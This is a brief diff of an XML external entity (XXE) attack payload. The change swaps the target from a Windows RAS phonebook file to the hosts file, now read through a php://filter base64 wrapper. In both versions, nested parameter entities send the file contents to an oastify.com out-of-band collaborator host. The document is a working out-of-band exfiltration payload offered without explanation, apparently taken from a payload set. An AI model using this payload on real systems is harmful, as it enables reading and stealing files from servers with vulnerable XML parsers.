@@ -1,4 +1,6 @@
-<!ENTITY % file SYSTEM "file:///c:/windows/system32/ras/phone.pbk">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nypvkqtw1r4om2a9pzu4624y4pajy9my.oastify.com/?phone=%file;'>">
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/windows/system32/drivers/etc/hosts">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nypvkqtw1r4om2a9pzu4624y4pajy9my.oastify.com/?x=%file;'>">
 %eval;
 %exfil;
+]>
